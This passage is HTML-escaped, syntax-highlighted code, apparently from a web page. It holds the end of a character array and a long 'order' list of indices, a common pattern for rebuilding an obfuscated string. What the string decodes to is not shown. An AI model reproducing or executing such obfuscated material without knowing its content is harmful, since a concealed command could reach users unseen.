#93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;K&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;R&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;8&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;e&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span 